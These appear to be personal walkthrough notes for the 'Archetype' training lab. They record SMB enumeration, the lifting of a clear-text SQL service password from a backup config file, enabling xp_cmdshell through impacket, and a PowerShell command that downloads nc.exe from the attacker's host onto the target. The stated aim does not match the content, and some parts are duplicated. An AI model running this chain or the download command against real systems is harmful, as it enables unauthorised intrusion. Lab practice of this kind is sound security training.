# ARTCHETYPE
Protocols
MSSQL
SMB
Powershell
Reconnaissance
Remote Code Execution
Clear Text Credentials
Information Disclosure
Anonymous/Guest Access

  ## AIM
    1. Learn how to exploit binary path hijacking and sudo permissions for privilege escalation.

```bash
export ip=
```
```zsh
┌──(root㉿kali)-[~]
└─# nmap $ip
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-02 14:55 UTC
Nmap scan report for $ip
Host is up (1.1s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s

Nmap done: 1 IP address (1 host up) scanned in 64.61 seconds

````






                                                                                                                                 
┌──(root㉿kali)-[~]
└─# smbclient -L \\\\10.129.117.121
Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.117.121 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
                                                                                                                                 
┌──(root㉿kali)-[~]
└─# smbclient \\\\10.129.117.121/ADMIN$ 
Password for [WORKGROUP\root]:
tree connect failed: NT_STATUS_ACCESS_DENIED
                                                                                                                                 
┌──(root㉿kali)-[~]
└─# smbclient \\\\10.129.117.121\\ADMIN$
Password for [WORKGROUP\root]:
tree connect failed: NT_STATUS_ACCESS_DENIED
                                                                                                                                 
┌──(root㉿kali)-[~]
└─# smbclient \\\\10.129.117.121\\backups
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jan 20 12:20:57 2020
  ..                                  D        0  Mon Jan 20 12:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 12:23:02 2020

                5056511 blocks of size 4096. 2617790 blocks available
smb: \> get prod.dtsConfig
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
smb: \> quit
                                                                                                                                 
┌──(root㉿kali)-[~]
└─# smbclient \\\\10.129.117.121\\C$     
Password for [WORKGROUP\root]:
tree connect failed: NT_STATUS_ACCESS_DENIED
                                                                                                                                 
┌──(root㉿kali)-[~]
└─# smbclient \\\\10.129.117.121\\IPC$
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_NO_SUCH_FILE listing \*
smb: \> quit
                                                                                                                                 
┌──(root㉿kali)-[~]
└─# smbclient \\\\10.129.117.121\\IPC$
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> help
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
mkfifo         more           mput           newer          notify         
open           posix          posix_encrypt  posix_open     posix_mkdir    
posix_rmdir    posix_unlink   posix_whoami   print          prompt         
put            pwd            q              queue          quit           
readlink       rd             recurse        reget          rename         
reput          rm             rmdir          showacls       setea          
setmode        scopy          stat           symlink        tar            
tarmode        timeout        translate      unlock         volume         
vuid           wdel           logon          listconnect    showconnect    
tcon           tdis           tid            utimes         logoff         
..             !              
smb: \> 






use of `smbclient` to connect to SMB shares and the resulting interactions with a Windows system.

## Connecting to SMB Shares

We begin by listing available SMB shares on the target system using the command:

```bash
smbclient -L \\10.129.117.121
```

This command prompts for a password and returns the following shares:

- **ADMIN$**: Remote Admin
- **backups**: (no comment)
- **C$**: Default share
- **IPC$**: Remote IPC

However, we encounter an error when attempting to reconnect using SMB1, indicating that there may be no workgroup available.

## Accessing ADMIN$ Share

Next, we try to connect to the `ADMIN$` share:

```bash
smbclient \\10.129.117.121\ADMIN$
```

Unfortunately, we receive an `NT_STATUS_ACCESS_DENIED` error, which means we do not have the necessary permissions.

## Accessing Backups Share

We successfully connect to the `backups` share:

```bash
smbclient \\10.129.117.121\backups
```

After entering the password, we list the contents of the share:

```bash
smb: \> ls
```

The output shows two directories and a file named `prod.dtsConfig`. We can download this file:

```bash
smb: \> get prod.dtsConfig
```

The file is retrieved successfully.

## Attempting to Access Other Shares

Next, we try accessing the `C$` share:

```bash
smbclient \\10.129.117.121\C$
```

Again, we face an `NT_STATUS_ACCESS_DENIED` error, suggesting insufficient permissions.

We also attempt to connect to the `IPC$` share:

```bash
smbclient \\10.129.117.121\IPC$
```

After logging in, we try listing the contents:

```bash
smb: \> ls
```

This command returns an `NT_STATUS_NO_SUCH_FILE` error, indicating that the share may not have any files available for listing.

## Conclusion

Throughout this session, we learned that while we could access the `backups` share, other shares like `ADMIN$`, `C$`, and `IPC$` were inaccessible due to permission restrictions. This illustrates the importance of proper credentials and permissions when working with SMB shares.
```










```bash                                                                                                                                 
┌──(root㉿kali)-[~]
└─# ls
prod.dtsConfig
                                                                                                                                 
┌──(root㉿kali)-[~]
└─# cat prod.dtsConfig 
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>                                                                                                                                 
```





──(root㉿kali)-[~]
└─# cat prod.dtsConfig 
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>                                                                                                                                 
┌──(root㉿kali)-[~]
└─# git clone https://github.com/fortra/impacket.git
Cloning into 'impacket'...
remote: Enumerating objects: 24216, done.
remote: Counting objects: 100% (4609/4609), done.
remote: Compressing objects: 100% (351/351), done.
remote: Total 24216 (delta 4421), reused 4258 (delta 4258), pack-reused 19607 (from 1)
Receiving objects: 100% (24216/24216), 9.43 MiB | 1.66 MiB/s, done.
Resolving deltas: 100% (18638/18638), done.
                                                                                                                                 
┌──(root㉿kali)-[~]
└─# alias py=python   
                                                                                                                                 
┌──(root㉿kali)-[~]
└─# cd impacket/examples 
                                                                                                                                 
┌──(root㉿kali)-[~/impacket/examples]
└─# ls
addcomputer.py     exchanger.py        getST.py          mimikatz.py       ping6.py          rpcmap.py       sniff.py
atexec.py          findDelegation.py   getTGT.py         mqtt_check.py     ping.py           sambaPipe.py    split.py
changepasswd.py    GetADComputers.py   GetUserSPNs.py    mssqlclient.py    psexec.py         samrdump.py     ticketConverter.py
dacledit.py        GetADUsers.py       goldenPac.py      mssqlinstance.py  raiseChild.py     secretsdump.py  ticketer.py
dcomexec.py        getArch.py          karmaSMB.py       net.py            rbcd.py           services.py     tstool.py
describeTicket.py  Get-GPPPassword.py  keylistattack.py  netview.py        rdp_check.py      smbclient.py    wmiexec.py
dpapi.py           GetLAPSPassword.py  kintercept.py     ntfs-read.py      registry-read.py  smbexec.py      wmipersist.py
DumpNTLMInfo.py    GetNPUsers.py       lookupsid.py      ntlmrelayx.py     reg.py            smbserver.py    wmiquery.py
esentutl.py        getPac.py           machine_role.py   owneredit.py      rpcdump.py        sniffer.py
                                                                                                                                 
                                                                                                                                 
┌──(root㉿kali)-[~/impacket/examples]
└─# py mssqlclient.py ARCHETYPE/sql_svc@$ip -windows-auth     
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL (ARCHETYPE\sql_svc  dbo@master)> help

    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means
    disable_xp_cmdshell        - you know what it means
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonated
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    xp_dirtree {path}          - executes xp_dirtree on the path
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    ! {cmd}                    - executes a local shell cmd
    show_query                 - show query
    mask_query                 - mask query
    
SQL (ARCHETYPE\sql_svc  dbo@master)> enable_xp_cmdshell
[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (ARCHETYPE\sql_svc  dbo@master)> SELECT is_srvrolemember('sysadmin');
    
-   
1   

SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'cd'
output                
-------------------   
C:\Windows\system32   

NULL                  

SQL (ARCHETYPE\sql_svc  dbo@master)> 





    
SQL (ARCHETYPE\sql_svc  dbo@master)> enable_xp_cmdshell
[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (ARCHETYPE\sql_svc  dbo@master)> SELECT is_srvrolemember('sysadmin');
    
-   
1   

SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'cd'
output                
-------------------   
C:\Windows\system32   

NULL                  

SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'dir C:\'
output                                                       
----------------------------------------------------------   
 Volume in drive C has no label.                             

 Volume Serial Number is 9565-0B4F                           

NULL                                                         

 Directory of C:\                                            

NULL                                                         

01/20/2020  05:20 AM    <DIR>          backups               

07/27/2021  02:28 AM    <DIR>          PerfLogs              

07/27/2021  03:20 AM    <DIR>          Program Files         

07/27/2021  03:20 AM    <DIR>          Program Files (x86)   

01/19/2020  11:39 PM    <DIR>          Users                 

07/27/2021  03:22 AM    <DIR>          Windows               

               0 File(s)              0 bytes                

               6 Dir(s)  10,722,205,696 bytes free           

NULL                                                         

SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'dir C:\Users'
output                                                 
----------------------------------------------------   
 Volume in drive C has no label.                       

 Volume Serial Number is 9565-0B4F                     

NULL                                                   

 Directory of C:\Users                                 

NULL                                                   

01/19/2020  04:10 PM    <DIR>          .               

01/19/2020  04:10 PM    <DIR>          ..              

01/19/2020  11:39 PM    <DIR>          Administrator   

01/19/2020  11:39 PM    <DIR>          Public          

01/20/2020  06:01 AM    <DIR>          sql_svc         

               0 File(s)              0 bytes          

               5 Dir(s)  10,722,205,696 bytes free     

NULL                                                   

SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'dir C:\Users\public'
output                                               
--------------------------------------------------   
 Volume in drive C has no label.                     

 Volume Serial Number is 9565-0B4F                   

NULL                                                 

 Directory of C:\Users\public                        

NULL                                                 

01/19/2020  11:39 PM    <DIR>          .             

01/19/2020  11:39 PM    <DIR>          ..            

01/19/2020  11:39 PM    <DIR>          Documents     

09/15/2018  12:12 AM    <DIR>          Downloads     

09/15/2018  12:12 AM    <DIR>          Music         

09/15/2018  12:12 AM    <DIR>          Pictures      

09/15/2018  12:12 AM    <DIR>          Videos        

               0 File(s)              0 bytes        

               7 Dir(s)  10,722,205,696 bytes free   

NULL                                                 

SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'dir C:\Users\public\Downloads'
output                                               
--------------------------------------------------   
 Volume in drive C has no label.                     

 Volume Serial Number is 9565-0B4F                   

NULL                                                 

 Directory of C:\Users\public\Downloads              

NULL                                                 

09/15/2018  12:12 AM    <DIR>          .             

09/15/2018  12:12 AM    <DIR>          ..            

               0 File(s)              0 bytes        

               2 Dir(s)  10,722,205,696 bytes free   

NULL                                                 

SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'powershell Invoke-WebRequest -Uri http://10.10.16.39:8080/nc.exe -OutFile C:\Users\Public\Downloads\nc.exe'
output   
------   
NULL     

SQL (ARCHETYPE\sql_svc  dbo@master)> 

























                                                                                                                                 
┌──(root㉿kali)-[~]
└─# updatedb
                                                                                                                                 
┌──(root㉿kali)-[~]
└─# locate nc.exe
/usr/share/windows-resources/binaries/nc.exe
                                                                                                                                 
┌──(root㉿kali)-[~]
└─# mkdir server
                                                                                                                                 
┌──(root㉿kali)-[~]
└─# cd server
                                                                                                                                 
┌──(root㉿kali)-[~/server]
└─# cp /usr/share/windows-resources/binaries/nc.exe nc.exe
                                                                                                                                 
┌──(root㉿kali)-[~/server]
└─# python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.129.117.121 - - [02/Oct/2024 16:19:15] "GET /nc.exe HTTP/1.1" 200 -




















To check if `nc.exe` has been downloaded to `C:\Users\Public\Downloads`, you can use PowerShell to verify its existence.

### Check if the File Exists

1. **Open PowerShell.**

2. **Run the following command:**

   ```powershell
   Test-Path C:\Users\Public\Downloads\nc.exe
   ```

### Expected Results

- If the file exists, the command will return `True`.
- If the file does not exist, it will return `False`.

### Example Output

```powershell
True  # If the file exists
False # If the file does not exist
```







To check if `nc.exe` has been downloaded to `C:\Users\Public\Downloads` using the Command Prompt (cmd), you can use the `dir` command. Here’s how:

### Steps to Check in Command Prompt

1. **Open Command Prompt**: Press `Win + R`, type `cmd`, and press Enter.

2. **Run the following command**:

   ```cmd
   dir C:\Users\Public\Downloads\nc.exe
   ```

### Expected Results

- If the file exists, you will see information about the file, including its size and date modified.
- If the file does not exist, you will see a message like:

   ```
   File Not Found
   ```

### Example Command

Here’s what it looks like in the Command Prompt:

```cmd
C:\> dir C:\Users\Public\Downloads\nc.exe
```
